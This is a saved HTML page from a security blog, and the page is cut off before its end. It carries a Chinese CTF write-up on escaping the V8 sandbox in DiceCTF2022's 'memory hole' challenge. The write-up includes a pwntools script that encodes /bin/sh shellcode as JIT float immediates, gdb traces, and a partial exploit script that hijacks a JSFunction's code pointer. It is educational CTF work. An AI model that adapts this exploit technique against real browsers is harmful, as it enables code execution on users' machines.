@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Jayl1n">
+<meta name="baidu-site-verification" content="elXpeED2jg">
+
+
+    
+    
+
+
+<meta name="description" content="记录安全相关的琐碎">
+<meta name="keywords" content="安全 编程 开发 博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Jayl1n&#39;s Blog">
+<meta property="og:url" content="https://jayl1n.github.io/index.html">
+<meta property="og:site_name" content="Jayl1n&#39;s Blog">
+<meta property="og:description" content="记录安全相关的琐碎">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jayl1n&#39;s Blog">
+<meta name="twitter:description" content="记录安全相关的琐碎">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Jayl1n&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/cat.jpg">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="css/style.css">
+
+
+    <style> .article { opacity: 0;} </style>
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Jayl1n&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: true,
+        isPost: false,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?08bebd32e2a42a1273ff796a43439f77";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/cat.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Jayl1n</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="index.html">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="tags/BLOG/">BLOG</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/工具分享/">工具分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/开发/">开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://redteam.today">李三的剑谱</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://blog.l0ca1.xyz/">l0cal</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://7o8v.me/">7o8v</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://godot.win/">Godot</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://evoa.me/">evoA</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://abcdefghijklmnopqrst.xyz/">骑麦兜看落日</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://kkdlong.win">kkdlong</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Jayl1n</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/cat.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Jayl1n</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="index.html">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:panja@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://www.github.com/Jayl1n" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-v8-sandbox-escape" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="2022/02/27/v8-sandbox-escape/" class="article-date">
+      <time datetime="2022-02-27T03:17:27.000Z" itemprop="datePublished">2022-02-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="2022/02/27/v8-sandbox-escape/">V8 沙盒绕过</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <blockquote>
+<p>本文首发于跳跳糖 <a href="https://tttang.com/archive/1443/" target="_blank" rel="noopener">https://tttang.com/archive/1443/</a> </p>
+</blockquote>
+<h1 id="V8-沙箱绕过"><a href="#V8-沙箱绕过" class="headerlink" title="V8 沙箱绕过"></a>V8 沙箱绕过</h1><p>这是 DiceCTF2022 的一道题 memory hole。</p>
+<p>题目给了我们修改任意 array 的 length 的能力，按过往的经验，接下来很简单，就是构造任意地址读写原语，构造 WASM 实例，读 RWX 空间地址，写 shellcode ，调 WASM 函数，结束。</p>
+<p>但题目开启了 V8 沙箱，一个新的安全机制，直接阻止了我们构造任意地址读写，能访问的范围是 array 基址后连续的 4G 地址空间。</p>
+<p>绕过这个沙箱是本题的重点，看了两篇wp有所收获，所以整理了下绕过手法，未来可能会用到。</p>
+<p>【题目地址】 <a href="https://github.com/Jayl1n/CTF-Writeup/blob/master/DiceCTF2022/memory-hole/1984.tar.gz" target="_blank" rel="noopener">https://github.com/Jayl1n/CTF-Writeup/blob/master/DiceCTF2022/memory-hole/1984.tar.gz</a></p>
+<h1 id="指针压缩"><a href="#指针压缩" class="headerlink" title="指针压缩"></a>指针压缩</h1><p>64 位 V8 中使用了“指针压缩”的技术，即将 64 位指针转为 <code>js_base + offset</code> 的形式，只在内存当中存储 <code>offset</code> ，寄存器 <code>$14</code> 存储 <code>js_base</code> ，其中 <code>offset</code> 是 32 位的。JS 对象在解引用时，会从 <code>$r14 + offset</code> 的地址加载。因此 <code>js_base + offset</code> 被限制在很小的一个区域，无法访问任意地址。</p>
+<p>如下，没有开启“指针压缩”的 <code>ArrayBuffer</code> 内存布局：</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled.png" alt="Untitled"></p>
+<p>开启后：</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%201.png" alt="Untitled"></p>
+<p>绕过“指针压缩”的方法很简单，因为“指针压缩”只对堆上指针使用，堆外指针不会压缩。<code>ArrayBuffer</code> 的 <code>BackingStore</code> 是个堆外指针，可以直接修改 <code>BackingStore</code> 为任意地址进而实现任意地址读写。</p>
+<h1 id="V8-沙箱"><a href="#V8-沙箱" class="headerlink" title="V8 沙箱"></a>V8 沙箱</h1><p>V8 沙箱扩展“指针压缩”将 V8 堆上的所有原始指针都 “沙盒化”，比如 <code>WebAssembly</code> 的 <code>RWX</code> 页指针和 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 指针。将这些外部指针都转为表的索引，以基址+偏移的方式访问，限制指针能访问的范围，防止攻击者利用 V8 漏洞实现内存任意地址读写。</p>
+<p><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf" target="_blank" rel="noopener">V8 Sandbox - High-Level Design Doc</a></p>
+<p>如下，未开启 V8 沙箱时的 <code>ArrayBuffer</code> 对象内存布局：</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%202.png" alt="Untitled"></p>
+<p>开启沙箱后，<code>BackingStore</code> 替换为 0x45c00000000（偏移量 0x45c00，向左移动 24 位保证最高位为 0）。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%203.png" alt="Untitled"></p>
+<p>此时假设攻击者能从多个线程中任意破坏沙箱内的内存，现在需要一个额外的漏洞破坏沙箱外部的内存，从而执行任意代码。</p>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="方法一：利用立即数写-shellcode"><a href="#方法一：利用立即数写-shellcode" class="headerlink" title="方法一：利用立即数写 shellcode"></a>方法一：利用立即数写 shellcode</h2><p><em>(参考 <a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html" target="_blank" rel="noopener">https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html</a>）</em></p>
+<h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><p>先 DebugPrint 一个 <code>JSFunction</code> 的内存结构：</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%204.png" alt="Untitled"></p>
+<p>这里有一个 <code>code</code> 字段，它指向了函数要执行的汇编指令，处于 <code>r-x</code> 页。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%205.png" alt="Untitled"></p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%206.png" alt="Untitled"></p>
+<p>用 gdb 修改 <code>code</code> 字段 <code>0x41414141</code> 。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%207.png" alt="Untitled"></p>
+<p>继续执行，出现异常，此时 <code>rcx</code> 是 <code>0x2a0c41414141</code> ，即基址(0x2a0c00000000)+偏移(0x41414141)。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%208.png" alt="Untitled"></p>
+<p>看这段汇编，如果我们令<code>[rcx + 0x1b] &amp; 0x20000000 = 0</code> ，<code>rip</code> 就会在之后被设置为 <code>rcx+0x3f</code> ，从而劫持 <code>rip</code> ，这个条件是比较容易满足的。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%209.png" alt="Untitled"></p>
+<h3 id="使用立即数构造-shellcode"><a href="#使用立即数构造-shellcode" class="headerlink" title="使用立即数构造 shellcode"></a>使用立即数构造 shellcode</h3><p>JS 函数的 JIT 代码存储在堆内，即基址开头的 32 位区域，如下，基址都是 <code>0x350f00000000</code> 。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2010.png" alt="Untitled"></p>
+<p>这个函数返回的是一个浮点数组，在汇编里，每个浮点数以<strong>立即数</strong>的形式存在，<strong>立即数</strong>占 8 个字节。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2011.png" alt="Untitled"></p>
+<p>立即数同样可以被识别为汇编指令，很容易想到可以利用这个<strong>立即数</strong>来布置 shellcode，只要将 shellcode 片段用 <code>jmp</code> 连接起来，就能将一个个立即数串联起来，实现完整的功能。</p>
+<p><code>jmp</code> 短跳需要 2 个字节，剩下 6 个字节可以自由发挥。</p>
+<p>参考原作的脚本生成 shellcode，再将输出转为 IEEE 浮点表示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&apos;amd64&apos;)</span><br><span class="line">jmp = b&apos;\xeb\x0c&apos;</span><br><span class="line">shell = u64(b&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">def make_double(code):</span><br><span class="line">	assert len(code) &lt;= 6</span><br><span class="line">	print(hex(u64(code.ljust(6, b&apos;\x90&apos;) + jmp))[2:])</span><br><span class="line"></span><br><span class="line">make_double(asm(&quot;push %d; pop rax&quot; % (shell &gt;&gt; 0x20)))</span><br><span class="line">make_double(asm(&quot;push %d; pop rdx&quot; % (shell % 0x100000000)))</span><br><span class="line">make_double(asm(&quot;shl rax, 0x20; xor esi, esi&quot;))</span><br><span class="line">make_double(asm(&quot;add rax, rdx; xor edx, edx; push rax&quot;))</span><br><span class="line">code = asm(&quot;mov rdi, rsp; push 59; pop rax; syscall&quot;)</span><br><span class="line">assert len(code) &lt;= 8</span><br><span class="line">print(hex(u64(code.ljust(8, b&apos;\x90&apos;)))[2:])</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Output:</span><br><span class="line">ceb580068732f68</span><br><span class="line">ceb5a6e69622f68</span><br><span class="line">cebf63120e0c148</span><br><span class="line">ceb50d231d00148</span><br><span class="line">50f583b6ae78948</span><br><span class="line"></span><br><span class="line">IEEE:</span><br><span class="line">1.95538254221075331056310651818E-246</span><br><span class="line">1.95606125582421466942709801013E-246</span><br><span class="line">1.99957147195425773436923756715E-246</span><br><span class="line">1.95337673326740932133292175341E-246</span><br><span class="line">2.63486047652296056448306022844E-284</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>生成出来的 shellcode 是通过系统调用执行 <code>/bin/sh</code> 。</p>
+<p>跟一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job 0x3de400045681</span><br><span class="line">0x3de400045681: [Code]</span><br><span class="line"> - map: 0x3de40800263d &lt;Map&gt;</span><br><span class="line"> - code_data_container: 0x3de4081d360d &lt;Other heap object (CODE_DATA_CONTAINER_TYPE)&gt;</span><br><span class="line">kind = TURBOFAN</span><br><span class="line">stack_slots = 6</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = 0x3de400045681</span><br><span class="line"></span><br><span class="line">Instructions (size = 388)</span><br><span class="line">0x3de4000456c0     0  8b59d0               movl rbx,[rcx-0x30]</span><br><span class="line">...</span><br><span class="line">0x3de400045735    75  c5fb114107           vmovsd [rcx+0x7],xmm0</span><br><span class="line">0x3de40004573a    7a  49ba682f73680058eb0c REX.W movq r10,0xceb580068732f68</span><br><span class="line">0x3de400045744    84  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de400045749    89  c5fb11410f           vmovsd [rcx+0xf],xmm0</span><br><span class="line">0x3de40004574e    8e  49ba682f62696e5aeb0c REX.W movq r10,0xceb5a6e69622f68</span><br><span class="line">0x3de400045758    98  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de40004575d    9d  c5fb114117           vmovsd [rcx+0x17],xmm0</span><br><span class="line">0x3de400045762    a2  49ba48c1e02031f6eb0c REX.W movq r10,0xcebf63120e0c148</span><br><span class="line">0x3de40004576c    ac  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de400045771    b1  c5fb11411f           vmovsd [rcx+0x1f],xmm0</span><br><span class="line">0x3de400045776    b6  49ba4801d031d250eb0c REX.W movq r10,0xceb50d231d00148</span><br><span class="line">0x3de400045780    c0  c4c1f96ec2           vmovq xmm0,r10</span><br><span class="line">0x3de400045785    c5  c5fb114127           vmovsd [rcx+0x27],xmm0</span><br><span class="line">0x3de40004578a    ca  49ba4889e76a3b580f05 REX.W movq r10,0x50f583b6ae78948</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>以指令格式查看这几个立即数，可以看到这几个立即数是通过 <code>jmp</code> 串联起来了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/3i 0x3de40004573c</span><br><span class="line">   0x3de40004573c:	push   0x68732f</span><br><span class="line">   0x3de400045741:	pop    rax</span><br><span class="line">   0x3de400045742:	jmp    0x3de400045750</span><br><span class="line">gef➤  x/3i 0x3de400045750</span><br><span class="line">   0x3de400045750:	push   0x6e69622f</span><br><span class="line">   0x3de400045755:	pop    rdx</span><br><span class="line">   0x3de400045756:	jmp    0x3de400045764</span><br><span class="line">gef➤  x/3i 0x3de400045764</span><br><span class="line">   0x3de400045764:	shl    rax,0x20</span><br><span class="line">   0x3de400045768:	xor    esi,esi</span><br><span class="line">   0x3de40004576a:	jmp    0x3de400045778</span><br><span class="line">gef➤  x/4i 0x3de400045778</span><br><span class="line">   0x3de400045778:	add    rax,rdx</span><br><span class="line">   0x3de40004577b:	xor    edx,edx</span><br><span class="line">   0x3de40004577d:	push   rax</span><br><span class="line">   0x3de40004577e:	jmp    0x3de40004578c</span><br><span class="line">gef➤  x/4i 0x3de40004578C</span><br><span class="line">   0x3de40004578c:	mov    rdi,rsp</span><br><span class="line">   0x3de40004578f:	push   0x3b</span><br><span class="line">   0x3de400045791:	pop    rax</span><br><span class="line">   0x3de400045792:	syscall</span><br></pre></td></tr></table></figure>
+<h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p>接下来就是劫持 <code>rip</code> 。</p>
+<p>修改 JSFunction 对象的 <code>code</code> 字段，令 <code>code + 0x3f = 0x3de40004573c</code> 。</p>
+<p><code>code</code> 的计算方式 <code>0x3de400045681 + (0x3de40004573c - 0x3f - 0x3de400045681) = 0x3de400045681 + 0x7c</code> ，即原 <code>code</code> 值加 <code>0x7c</code> ，具体各位自行体会，原作的 <code>jitAddr + 0xb3 - 0x3f</code> 的计算在我这跑不起来，差了 8 个字节，不知道是不是环境问题。</p>
+<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2012.png" alt="Untitled"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">function dp(x) &#123;&#125;// %DebugPrint(x);&#125;</span><br><span class="line">const print = () =&gt; &#123;&#125;;</span><br><span class="line">const assert = function (b, msg)</span><br><span class="line">&#123;</span><br><span class="line">	if (!b)</span><br><span class="line">		throw Error(msg);</span><br><span class="line">&#125;;</span><br><span class="line">const __buf8 = new ArrayBuffer(8);</span><br><span class="line">const __dvCvt = new DataView(__buf8);</span><br><span class="line">function d2u(val)</span><br><span class="line">&#123; //double ==&gt; Uint64</span><br><span class="line">	__dvCvt.setFloat64(0, val, true);</span><br><span class="line">	return __dvCvt.getUint32(0, true) +</span><br><span class="line">		__dvCvt.getUint32(4, true) * 0x100000000;</span><br><span class="line">&#125;</span><br><span class="line">function u2d(val)</span><br><span class="line">&#123; //Uint64 ==&gt; double</span><br><span class="line">	const tmp0 = val % 0x100000000;</span><br><span class="line">	__dvCvt.setUint32(0, tmp0, true);</span><br><span class="line">	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);</span><br><span class="line">	return __dvCvt.getFloat64(0, true);</span><br><span class="line">&#125;</span><br><span class="line">function d22u(val)</span><br><span class="line">&#123; //double ==&gt; 2 * Uint32</span><br><span class="line">	__dvCvt.setFloat64(0, val, true);</span><br><span class="line">&#125;</span><br><span class="line">const hex = (x) =&gt; (&quot;0x&quot; + x.toString(16));</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">One weird thing is that as long as a function contains floating const,</span><br><span class="line">allocated array object cannot reach the function object by OOB;</span><br><span class="line">therefore, we use TypedArray arbitrary R/W in sbx to rewrite its field.</span><br><span class="line">*/</span><br><span class="line">const foo = ()=&gt;</span><br><span class="line">&#123;</span><br><span class="line">	return [</span><br><span class="line">        1.0,</span><br><span class="line">		1.95538254221075331056310651818E-246,</span><br><span class="line">		1.95606125582421466942709801013E-246,</span><br><span class="line">		1.99957147195425773436923756715E-246,</span><br><span class="line">		1.95337673326740932133292175341E-246,</span><br><span class="line">		2.63486047652296056448306022844E-284];</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++) &#123;</span><br><span class="line">	foo();foo();foo();foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const f = () =&gt; 123;</span><br><span class="line">const arr = [1.1];</span><br><span class="line">const o = &#123;x:0x1337, a:foo, b:f&#125;; // x makes a and b double align</span><br><span class="line">const ua = new Uint32Array(2);</span><br><span class="line"></span><br><span class="line">arr.setLength(36);</span><br><span class="line">d22u(arr[3]);</span><br><span class="line">const fooAddr = __dvCvt.getUint32(0, true);</span><br><span class="line">const fAddr = __dvCvt.getUint32(4, true);</span><br><span class="line">print(hex(fAddr));dp(f);</span><br><span class="line">dp(ua);</span><br><span class="line"></span><br><span class="line">function readOff(off)</span><br><span class="line">&#123;</span><br><span class="line">	arr[35] = u2d((off-7) * 0x100000000);</span><br><span class="line">	return ua[0];</span><br><span class="line">&#125;</span><br><span class="line">function writeOff(off, val)</span><br><span class="line">&#123;</span><br><span class="line">	arr[35] = u2d((off-7) * 0x100000000);</span><br><span class="line">	ua[0] = val;</span><br><span class="line">&#125;</span><br><span class="line">print(hex(fooAddr));dp(foo);</span><br><span class="line">jitAddr = readOff(fooAddr + 0x17);</span><br><span class="line">print(&apos;jitAddr&apos;);</span><br><span class="line">print(hex(jitAddr));</span><br><span class="line">print(&apos;rcx + 